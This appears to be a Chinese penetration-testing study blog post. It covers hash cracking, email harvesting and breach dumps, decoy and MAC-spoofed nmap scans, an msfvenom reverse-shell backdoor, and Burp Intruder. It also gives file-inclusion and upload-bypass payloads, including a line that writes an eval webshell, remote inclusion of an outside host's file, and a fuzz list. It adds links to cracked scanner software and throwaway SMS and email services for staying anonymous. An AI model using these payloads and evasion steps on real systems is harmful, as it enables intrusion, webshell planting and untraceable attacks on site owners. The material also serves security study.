![在这里插入图片描述](https://img-blog.csdnimg.cn/20210602123135715.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210602123438725.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
kali上还有类似的工具是Hash-identifier,但是功能没有这么强大。使用方法仍旧一样，但你仍需学会，因为针对一个hash值不同的工具识别结果可能会不一样。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210602124320696.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

#### 破解

##### john

运行 John the Ripper 的基本语法是 john [options] [hashfile]。使用John最基本的语法是“john hashes.txt”，它尝试了一系列常见的破解模式。此命令告诉 John 尝试简单模式，然后是包含可能密码的默认单词列表，最后是增量模式。以这种方式使用 John 非常耗时，不建议用于密码/哈希破解。
比较推荐的密码/哈希破解方法是使用单词列表并指定哈希类型。为此，选项 --wordlist 用于指定具有潜在密码列表的文件，而 --format 用于指定哈希类型。例如，将这些选项与 snefru-256 哈希类型一起使用的语法是“john --wordlist=rockyou.txt --format=snefru-256 hashes.txt”。要查看用于破解哈希 2b4d9aa78976ec807986c1ea298d32418c85581b5625796c49bd6ecc146b1ef9（已添加到文件 hashes.txt）的此语法的示例
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210602125119510.png)
于密码位于rockyou.txt 文件中并且snefru-256 被识别为正确的哈希类型，因此密码/哈希破解花费的时间非常短。这个过程并不总是那么快，可能需要数小时才能破解更复杂的密码/哈希。

##### hashcat
多算法，资源利用率低，基于字典攻击，支持分布式破解等等。kail有集成

> -a  破解模式。“-a 0”字典攻击，“-a 1” 组合攻击；“-a 3”掩码攻击。
-m  指定要破解的hash类型，如果不指定类型，则默认是MD5
--force 忽略破解过程中的警告信息,跑单条hash可能需要加上此选项


```bash
hashcat -a 0 -m 1000 hash文本路径 字典路径 --force
```


详细中文介绍hashcat工具文档看 https://xz.aliyun.com/t/4008



### 邮箱信息

#### 搜集

**只适用于大型网站**
要想爆破邮箱账号，肯定首先得有足够多的邮箱账号。那么，我们从哪里去获取目标邮箱系统的邮箱账号呢？

https://hunter.io/  
https://www.email-format.com/i/search/
这两个网站只要输入目标域名，就可以从互联网上搜到对应格式的邮箱账号

**看天意**
常用的邮箱名是：姓名拼音@xx.com
可以靠常用姓名的拼音来对邮箱进行猜
#### 验证是否被弃用

https://mailtester.com/testmail.php
https://github.com/Tzeross/verifyemail

#### 验证邮箱是否泄露了密码 
https://haveibeenpwned.com/

获取 email 帐户的最佳方法之一是持续监控和捕捉过去的违规行为。我不想直接链接到违规文件，但我给出一些我认为有用的参考:
1.4 亿密码泄露（2017年）： https://thehackernews.com/2017/12/data-breach-password-list.html
Adobe 信息泄露（2013年）： https://nakedsecurity.sophos.com/2013/11/04/anatomy-of-a-password-disaster-adobes-giant-sized-cryptographic-blunder/
Pastebin Dumps： http://psbdmp.ws/
Exploit.In Dump
Pastebin 的 Google Dork: site:pastebin.com intext:cyberspacekittens.com

## 综合工具

### 信息搜集

#### 电子邮件

从侦察阶段收集到的针对所有用户的大规模攻击，有很多很棒的资源可用于侦查和创建可定位的电子邮件地址列表，比如2019年的OSINT资源，The Harvester ，datasploit ，Github上的awesome-osint ）

##### Swaks

Swaks是由John Jetmore编写和维护的一种功能强大，灵活，可脚本化，面向事务的SMTP测试工具。可向任意目标发送任意内容的邮件。 
“swaks”这个名字是”SWiss Army Knife Smtp”的首字母缩略词.
发布网站http://www.jetmore.org/john/code/swaks/ 
这个工具kali自带。

使用细节

```bash
    To:收件人
    From:发件人
    Subject:主题
    Date:日期
    Subject:标题
```

通常怎么使用

```bash
swaks --body "内容" --header "Subject:标题" -t xxxxx@qq.com -f "admin@local.com"
```




#### theHarvester

TheHarvester能够收集电子邮件账号、用户名、主机名和子域名等信息。它通过Google、Bing、PGP、LinkedIn、Baidu、Yandex、People123、Jigsaw、Shodan等公开资源整理收集这些信息。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210602182750844.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210602183054356.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

#### sparta

kali已经集成，Sparta是一个Nmap、Nikto、Hydra等工具的集合，利用各个工具的优秀功能，完成信息收集、扫描和爆破等一体化的工具流。

Sparta主要包含以下功能：

端口扫描，程序自动调用nmap进行扫描，根据nmap的扫描结果，nikto自动加载结果，展开更精确的扫描。
针对扫描的结果，特定使用，如：使用dirbuster目录爆破，利用webslayer进行web指纹识别。
针对可爆力破解的端口，可调用hydra进行暴力破解。

**使用方法**
第一次在kali 中使用 需要先下载文件 

```bash
#这是我克隆到码云的，会加快国内下载速度。如果你不信任这个链接，请将链接改成  https://github.com/SECFORCE/sparta.git
git clone https://gitee.com/ngadminq/sparta.git

#切换到sparta文件夹，检索到sparta.py文件，利用python环境进行运行
python3 sparta.py
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210609161602160.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)




### 扫描端口
选一。以下工具在kali都有集成。
学习时了解基础参数用法，工具优缺点即可。
当在kali输入工具名时，就会弹出日志信息，这就能有效节约时间了，如下图
![在这里插入图片描述](https://img-blog.csdnimg.cn/619526b0f8d04cc9b9728484e25cc2b7.png)
我之前的文章版本写了关于nmap如何扫描漏洞等，但术业有专攻，nmap速度又慢，所以如果读者看到类似的文章，可选择性略读。
#### nmap

**扫描类型**
 全扫描
 即指TCP
全连接：默认扫描方式，扫描快但这种扫描很容易被检测到，在目标主机的日志中会记录大批的连接请求以及错误信息。
```bash
nmap -sT www.baidu.com
```

半扫描
SYN/ACK，相对隐蔽点

```bash
nmap -sS www.baidu.com
nmap -sA www.baidu.com
```

其他扫描
```bash
# ICMP
nmap -sP www.baidu.com
```


**攻击网站扫描参数**
此参数将尽可能全面、隐蔽。
有些参数耗时将很长，显示文档将太过全面。所以读者可以适当调整

```bash
nmap -A -v -sA -T0 --osscan-guess -p- -P0 --script=vuln 
--spoof-mac 09:22:71:11:15:E2 --version-intensity 9
 –D decoy1,decoy2,decoy3,target -oX log.xml
```
**常用命令**

```bash
nmap -A www.baidu.com
```


#### nbtscan 
#### masscan
**masscan** 该工具兼容Nmap 参数
扫描快但是不会显示端口服务的相关信息，将Nmap和Masscan结合，扬长避短，实现高效率扫描。为提高扫描效率，可以先使用masscan扫描开启的端口，再用nmap进行详细的扫描.[nmap](https://xz.aliyun.com/t/6001)![在这里插入图片描述](https://img-blog.csdnimg.cn/20210429021050113.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)






### 抓包工具

### 进程装包

  http://www.downcc.com/soft/11196.html
  ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210625104540882.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

#### Wireshark

Wireshark是绝对经典的，最著名的网络分析仪和密码破解工具。此工具是网络数据包分析器，该工具将尝试捕获用于分析，网络故障排除，分析，软件和通信协议开发的网络数据包，并尽可能详细地显示获得的数据包数据。
在Wireshark中，有颜色代码，用户可以看到以黑色，蓝色和绿色突出显示的数据包。一眼就能帮助用户识别流量类型。黑色确定存在问题的TCP数据包。蓝色是DNS流量，绿色是TCP流量。
只是这个工具很难控制，开启一秒钟就有大量数据包，需要我们一点点的筛选判断才能找准目标
Wireshark官方下载链接： https://www.wireshark.org/download.htmlZ

#### Burpsuite

**详细待补充burpsuite安装、功能模块、网页代理设置**
数据联动
Burp Intruder也可以通过字典攻击来实施强制浏览(通常是在url参数和文件路径部分进行修改)，爆破、注入等。


burpsuite当抓不到包时，可能是目标网站是个无发送数据包的网站，比如只有一些静态的js代码，你的交互都是在目标主机本机运行，因此就不会展示数据包。比如你也许认为上传操作都可以抓到数据包，然而事实上是有的数据包是js操作，所以根本就不会反馈数据包给你




hex是网站raw的二进制,在进行00截断时很有用。
对于扫描的结果如果有更进一步的探究在扫描结果里右击repeater。在burpsuite里扫描分为主动和被动被动扫描更温和，不会破坏程序和主动扫描显得更暴力但更全面，通常采用的都是主动扫描。
通过burpsuitede的repeater功能可以获取一些服务器信息，比如运行的Server类型及版本、PHP版本信息。repeater分析的选项有四种
虽然 burpsuite专业版才带有scaner，但笔者测试感觉这个功能不是很好用。![在这里插入图片描述](https://img-blog.csdnimg.cn/2021051200383657.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
在面试和实战中需要区分burpsuite攻击参数注入的基本方式

1. Sniper（狙击手）
   一个一个的来
   添加了一个参数的话，并且假设payload有500个的话，那就执行500次，


如果添加了两个参数的话，就会挨着来，第一个参数开始爆破时，第二个不变，如此这样，会进行500+500此 总共1000次爆破。


2. Battering ram（攻城锤）
   顾名思义，和狙击手差不多，一个参数的话都一样，只不过如果添加了两个参数的话，就一起进行爆破。那么两个参数爆破时候的值肯定就是一样的了。那么就只会进行500次爆破。

3. Pitchfork（草叉模式）
   此模式下如果只添加了一个参数的话，会报错


添加了两个参数的话 ，要求添加两个payload
pl1：1，2
pl2：3，4
那么第一爆破为 1，3
而二次爆破为2，4
如果两个payload行数不一致的话，取最小值进行测试。所以爆破的次数取两个中最小的为准。

4. Cluster bomb（集束炸弹）
   同pitchfork，起码两个参数，但此操作会计算两个的payload 的笛卡儿积。
   比如pl1：1，2，3
   pl2：4，5，6
   那么第一次爆破为 1，4
   第二次为1，5
   以此类推 1，6
   2，4
   2，5.。。。。。。

**模块**
repeater是结合其他模块一起使用的，做补发测试，得到的内容再进一步做手动修改参数
compare用于对比两次数据的差异，比如枚举用户名，查看返回登录结果的差异
Intruder是一个高度可配置工具，可以对web自动化攻击，模糊测试，sql注入，目录遍历等
[burpsuite 超全教程](https://t0data.gitbooks.io/burpsuite/content/)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210427161650538.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)



### 通用漏洞扫描工具


#### 网站扫描
AWVS较为轻量，扫描快。APPscan大但全，一般为发现网站漏洞会结合使用
**Awvs**

注意:登录类网站扫描要带cookies扫才能扫到
awvs_13.0.2009 web漏洞扫描器 安装教程,附下载破解包下载链接，具体看https://blog.csdn.net/weixin_41924764/article/details/109549947

**AppScan**

10.0.2安装破解 https://www.cnblogs.com/azhyueqin/p/14336807.html



### Cobaltstrike
集成了提权，凭据导出，端口转发，socket代理，office攻击，文件捆绑，钓鱼等功能。同时，Cobalt Strike还可以调用Mimikatz等其他知名工具

### kali
kali有600+渗透工具。



![在这里插入图片描述](https://img-blog.csdnimg.cn/20210510222251130.png)

https://blog.csdn.net/jayjaydream/article/details/82945384




#### 安装kali

很多黑客教学都是首先教你装一个虚拟机，再将kali系统装在虚拟机上。如果你用这样方式去攻击外网服务器，那么你可能需要使用到端口转化/端口映射。
但是最好的最快的方式是用U盘。一旦移除U盘，你的系统就将恢复
Kali安装到u盘加密、持久化    https://www.freebuf.com/sectool/271770.html

如果你不想系统直接变为KALI,且电脑装虚拟机卡顿，就在 https://cloud.tencent.com/online-service?from=developer|auth 注册一个云服务吧，我选的学生认证，价格是27/3月，但这个认证可选择而对系统较少，我没法直接选择Debian，就选择了centos，![在这里插入图片描述](https://img-blog.csdnimg.cn/20210616164431360.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
然后一步步跟随以下命令就可以安装成功。具体可以参考博客 https://blog.csdn.net/sc_Pease/article/details/107243610

```bash
yum install docker
systemctl start docker
systemctl status docker
docker pull registry.cn-hangzhou.aliyuncs.com/fordo/kali:latest
docker run -i -t 53e9507d8515 /bin/bash
```

安装成功后，进入kali系统后，输入nmap，打印如下：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210616170405781.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)





## 社会工程
setkits
默认集成在了kali；
社会工程学模块包含了很多功能，若鱼叉式网络攻击、网页攻击、邮件群发攻击、无线接入点攻击、二维码攻击等等。

## 后门
### msfvenom
msfvenom集成了msfpayload和msfencode
msfvenom重要参数：
-p payload设置 
-e 编码设置	用来做免杀                   
-a 系统结构
-s payload最大大小   
-i 编码次数
-o 输出文件
-f 生成文件格式。生成脚本执行文件或平台执行文件，如py,dll，exe等  `
 –x | -k	捆绑生成。伪装类似图片马的意思
 以下是常用命令
```bash
msfvenom –p windows/meterpreter/reverse_tcp –f exe –o C:\back.exe
```

#### Cobalt Strike
用来后期持久渗透，横向移动，流量隐藏、数据窃取的工具


## 待补充：购物建议
### 硬件
### 服务器
### 代理
**匿名性**
透明代理：告诉服务器你使用了代理IP，与你的真实IP
普通匿名：会告诉服务器使用了代理，但并不会泄露本机的真实IP
高级匿名：完全伪造IP
#### 国内
#### 国外
选离你所在的城市近的国家
## 你常用的
### 匿名工具

**手机**
下面是一些免费的接码平台，可以收取短信验证码

国际接码，不过中国的也很多 https://yunjisms.xyz/

大多是其他国家的手机号，你注册有的网站可能无法识别此号码https://www.bfkdim.com/
https://jiemahao.com
http://zg.114sim.com/


http://114sim.com/

https://yunduanxin.net/
http://z-sms.com/
https://zusms.com

www.kakasms.com
www.materialtools.com
www.suiyongsuiqi.com
mianfeijiema.com
www.114sim.com
yunduanxin.net
www.shejiinn.com
www.zusms.com


**邮箱**
好用 https://www.moakt.com/zh
https://temp-mail.org/zh/
https://www.guerrillamail.com/zh/
http://links.icamtech.com/

VPS

纯净无线设备

纯净移动设备

### 开放漏洞情报
cve
exploit.db
cnvd
cx security
securitytracker
### 寻找EXP

**网站**
0day.today － 世界最大的漏洞利用数据库公开了大量EXP工具，网站地址：https://cn.0day.today/

exploit.db
seebug
https://bugs.chromium.org/p/project-zero/issues/list?can=1&q=escalation&colspec=ID+Type+Status+Priority+Milestone+Owner+Summary&cells=ids
**软件**
searchsploit是一个离线Exploit-DB的命令行搜索工具
使用，所以就把他想象成搜索引擎就可以。此工具在kali就集成了，因此不必安装。

```bash
# 常用命令
searchsploit 搜索关键词  --exclude="不包含关键词"
```





# web安全

你应该根据网站的类型去鉴定最可能存在的漏洞是什么，比如社交最可能存在XSS、文件操作最可能存在包含上传或下载漏洞。根据你的猜想首先去测试最可能的网站的漏洞


一个任意链接特殊字符意义：  *https://www.baidu.com/s?ie=UTF-8&wd=owasp&tn=88093251_74_hao_pg*  用？隔开参数和资源，字段之间用&分开。有的网站如果只利用Content-Type字段判断文件类型，那么修改了就能恶意上传文件了。



## 中间人攻击
中间人攻击是一个（缺乏）相互认证的攻击；由于客户端与服务器之间在SSL握手的过程中缺乏相互认证而造成的漏洞

防御中间人攻击的方案通常基于一下几种技术

1.公钥基础建设PKI 使用PKI相互认证机制，客户端验证服务器，服务器验证客户端；上述两个例子中都是只验证服务器，这样就造成了SSL握手环节的漏洞，而如果使用相互认证的的话，基本可以更强力的相互认证

2.延迟测试

使用复杂加密哈希函数进行计算以造成数十秒的延迟；如果双方通常情况下都要花费20秒来计算，并且整个通讯花费了60秒计算才到达对方，这就能表明存在第三方中间人。

3.使用其他形式的密钥交换形式

## 反序列化（对象注入）

序列化：将中对象、类、数组、变量、匿名函数等，转化为字符串 方便保存到数据库或者文件中（将状态信息保存为字符串）
反序列化： 将字符串保存为状态信息

### PHP序列化与反序列化
#### 无类

**准备知识**
PHP对象字符串后打印结果的意义，注意对int和string的输出是不一样的：

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210713182708648.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
**php序列化与反序列化相关函数**

```bash
对象转换为字符串/字符串转换为对象
serialize()/unserialize()
```

unserialize（）在执行时如果传入的是非空，会调用苏醒函数__wakeup()
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210713183229700.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210713200413947.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

#### 有类

以下是php的一些常见魔法方法
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210713192123547.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
漏洞一般就是产生在魔法方法里，在魔法方法中执行危险函数。比如在析构函数里执行SQL语句查询


### JAVA序列化与反序列化

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210713203116925.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

#### 序列化函数介绍
实现序列化的是ObjectOutputStream 类的 writeObject() 方法可以实现序列化，实现反序列化的是ObjectInputStream类的readObject() 方法用于反序列化。

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210713204541992.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210713205037237.png)


序列化的结果一般都会被进行再次编码，因为不进行编码就是乱码格式不便于开发者识别这是什么东西。序列化且编码后的格式以rO0AB开头的是：base64(序列化);以aced开头的是：HEX(序列化）




#### 工具

https://github.com/frohoff/ysoserial
ysoserial 工具会帮助你实现序列化，然后对方程序再调用反序列化去执行危险命令

当你在目标网站发现一串数据是以rO0AB开头的，你可以先寻找目标站点是否有反序列化操作，即看这个序列化结果是否能被执行成正常代码或正常值得显示。如果是那么你就可以利用ysoserial去生成一段危险的序列化代码即payload。生成之后按照指定的编码格式，看是base64还是HEX，将这payload与前面目标网站抓取到的rO0AB序列化数据包替换。




## 文件操作

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210712164618229.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

文件读取
读取系统敏感文件
文件包含
可读取文件或代码执行
文件删除
删除配置文件可破坏网站
删除安装锁可重装
文件解压
如果上传文件为 tar / tar.gz 类型，可以尝试构压缩包内文件名为../../../../xxx 的tar包
文件导出
如果是CSV 或者 Excel可以注意一下CSV注入
### 文件读取

这通常是值sql中读写
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705181705882.png)
具体搜索关键字 常见load_file读取敏感信息.
这里要想使用得好这个函数，你需要结合我前面写的‘路径读取’来达到效果

**写入**
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705183450890.png)

写入需要结合前文所描述的后门怎么制作达到最好效果。



### 文件包含

将文件包含进去，调用指定文件的代码.这种漏洞也很好被确定，一般url包含形如file=1.txt的参数就可以疑似了。在进一步直接访问url/1.txt，如果返回的界面与带参数file=1.txt一样那么你就可以确认这是文件包含了 
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210712150822393.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)


文件包含的写法

```bash
<!--#include file="1.asp" -->
<!--#include file="top.aspx" -->
<c:import url="http://thief.one/1.jsp">
<jsp:include page="head.jsp"/>
<%@ include file="head.jsp"%>
<?php Include('test.php')?>
```

#### 本地文件包含

这类漏洞处理的两种方案，1进入你发现的敏感文件
2 上传木马到文件，然后进行文件读取
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210712162319492.png)

**无限制包含**
类似于如下，直接执行命令就可以进行文件的读取。
http://127.0.0.1:8080/include.php?filename=1.txt
http://127.0.0.1:8000/include.php?filename=../../../www.txt

**有限制**
这个限制可能是filename=1.txt网页后端强制添加后缀如加上'.html'

加特殊符号如？或者%23
%00截断：条件：magic_quotes_gpc=Off php版本<5.3.4（条件比较严格，不太推荐）

```bash
filename=../../../www.txt%00
```

溢出截断：条件：windows，点号需要长于256；linux长于4096 。
因爲.对于文件尾巴命名而言是没什么意义的

> windows:1.txt/././././././././././././././././././././././././././././././././././././././././././././
> 或
> 1.txt......................................................................................................................................................................................

  

     linux：1.txt............................................................................................................................

#### 远程协议包含

远程包含的危害要比本地文件包含的危害要大。
当all_url_include是开启的，就可以执行远程.
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210712153658277.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
你所需要准备一个远程文件，可以是txt，只要里面包含有敏感代码,网站是什么语言，你就写什么语言的代码
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210712154532580.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

http://127.0.0.1:8080/iclude.php?filename=http://www.xiaodi8.com/readme.txt
http://127.0.0.1:8080/include.php?filename=http://www.xiaodi8.com/readme.txt%20
http://127.0.0.1:8080/include.php?filename=http://www.xiaodi8.com/readme.txt%23
http://127.0.0.1:8080/include.php?filename=http://www.xiaodi8.com/readme.txt? 

#### 何种协议流玩法

前面远程和本地都是通过漏洞扫描工具等测出来的，协议流方法才是真正手工测试的方案。
https://www.cnblogs.com/endust/p/11804767.html
http://127.0.0.1:8080/include.php?filename=php://filter/convert.base64-encode/resource=1.txt
http://127.0.0.1:8080/include.php?filename=php://input POST:<?php system('ver')?>
<?php fputs(fopen('s.php'，'w'),'<?php @eval($_POST[cmd])?>';?>
http://127.0.0.1:8000/include.php?filename=file:///D:/phpstudy/PHPTutorial/www/1.txt
http://127.0.0.1:8080/include.php?filename=data://text/plain,<?php%20phpinfo();?>
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210712160934174.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

#### 防御

固定后缀
写固定比如后端只接受1.txt文件，其他一律不处理

### 文件下载


凡是网站有文件下载的功能都有可能发生漏洞。我们可以去分析下载链接和文件链接，已确定下载代码是在哪个目录。我们可以利用此漏洞下载敏感文件比如数据库配置等，也可以下载有价值的网站源码。
一般文件下载参数以post传递
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210712170018155.png)

**下载哪些文件**
配置文件（数据库，平台，各种等）


### 文件上传漏洞
首先对文件上传类型进行区分，是属于编辑器文件上传，还是属于第三方应用，还是会员中心。要确保文件上传是什么类型，就用什么类型方法对它进行后期测试。

上传漏洞值用户能够上传恶意脚本即webshell，上传成功的原因要么出现在管理员未对文件本身命名做过滤，要么是本身源码存在的特性。


字典生成 https://github.com/c0ny1/upload-fuzz-dic-builder


**经验**
上传参数名解析：明确那些东西能修改？
Contont-Disposition：一般可更改
Name：表单参数值，不能更改
Filename：文件名，可以更改

#### 利用
一般程序员都不会让你自己上传php的，上传最多的就是图像。
这时候你就需要配合其他漏洞才可以执行。

##### +解析漏洞
如果有解析漏洞，图像中代码就会被执行。常见的解析漏洞存在于

常见解析漏洞存在于
* IIS 5.x/6.0解析漏洞

> ①`/xx.asp/xx.jpg` xx.asp的目录将被解析
> 
> 利用：创建/.asp文件夹；上传xx.jpg
>   ②xx.asp;.jpg`:分号后面的不被解析
利用：上传xx.asp;.jpg


* Apache

> xx.php.uarepig.truee	解析文件是从右到左开始判断的，如果后缀名识别不了就会往左继续判断
> 
> 利用：上传xx.php.uarepig.truee

* Nginx <8.03

> xx.php%00.jpg	截断
> 
> 利用：上传xx.php%00.jpg

* 配置不当.htaccess
> 写入`AddType application/x-httpd-php .jpg`	服务器允许客户端上传该文件
> 利用：上传xx.jpg

* 配置不当IIS 7.0/IIS 7.5/ Nginx <8.03/lighttpd  
> 
> 前提：只支持php脚本php.ini中的参数cgi.fix_pathinfo。这是配置不当引起的
> xx.jpg/.php
> 利用：上传xx.jpg
> 访问xx.jpg/.php

图片马制作很简单，你可以轻松的上传它，但是如何执行起来就是另一项技术。
生成在同级文件下放入一句话木马和图，将其在win的cmd下输入

```bash
copy 1.jpg /b+1.php/a 1.jpg
```
##### +文件包含漏洞

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709135206289.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709135133834.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)









#### 逻辑漏洞

* 前端验证Content-Type值判断的，这时候比如服务器只能允许上传image/jpeg，那么上传了php后，通过burpsuite拦截，可以看到content-type变为了application/octet-stream，在加上content-Type改为image/jpeg就能完成上传。这种方法绝大多数行不通。
* 前端JS检测绕过，JS前端都可以看到防御函数的，可以用此方法。当然如果文件从前端过来后，后端仍旧对格式有上传后缀名判断，就行不通的

* 竞态条件上传，一般存在二次渲染就是当系统收到用户上传的图片时，先进行保存到服务器，或者是为了方便用户进行图片的删除或者改大小。这通常就涉及到两次保存，一般程序员在保存第一次时可能疏忽不会写冗长的代码来过滤。
只要成功保存一次，对于我们其实就够了，利用竞态，在文件被服务器删除之前访问。这时候对于系统来说就是打开了文件，打开就不能进行删除了。你制造竞态只需要不断请求修改数据包即可。启动爆破后，打开网页对php进行多次刷新访问，如果弹出一串奇怪的代码那就说明你已经执行成功了。这时候你要做的就是停止再刷新界面，将此界面保持就可以进行后门操作
*
##### 常规上传
**windows特性**
Windows不允许空格和点以及一些特殊字符作为结尾，创建这样的文件会自动取出，所以可以使用 xx.php[空格] ， xx.php.， xx.php/， xx.php::$DATA 可以上传脚本文件

**过滤不充分**

* 代码替换关键字

>递归过滤
>a.pphphp -> a.

以下字典是我根据本文的方法进行的初步总结，但这样的字典明显太小，你需要用网上公开的fuzz字典，推荐一个 https://github.com/c0ny1/upload-fuzz-dic-builder

```bash
.
 
::$$DATA
.php3
.php5
. .
.pphphp
%00.jpg
.PHp3
%00.jpg
/.jpg
;.jpg
.xxx
;.php
.p\nh\np

```

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709192845136.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)


### 文件删除

文件删除黑盒测试很难看到一般都是白盒测试。因为你要删除文件很难用到特定的函数去执行。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210717211623270.png)

unlink，delfile是php中对应删除的函数
删除数据库安装文件，可以重装数据库。

## 逻辑越权

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210712191714272.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

### 越权

用户登录的过程是先检测账户名和密码是不是对应得上，对应得上在根据用户的组给予相应权限。

****

水平越权：通过更换的某个ID之类的身份标识，从而使A账号获取(修改、删除等)B账号数据

垂直越权：使用低权限身份的账号，发送高权限账号才能有的请求，获得其高权限的操作。

未授权访问：通过删除请求中的认真信息后重放该请求，依旧可以访问或者完成操作。

#### 水平越权

原理：

 - 前端安全造成：界面判断用户等级后，代码界面部分进行可选显示。
 - 后盾安全造成：数据库

**常见修改参数**
如果有水平越权，常见修改数据包的参数有 uid、用户名、cookie的uid值也可以尝试修改的

**敏感操作**
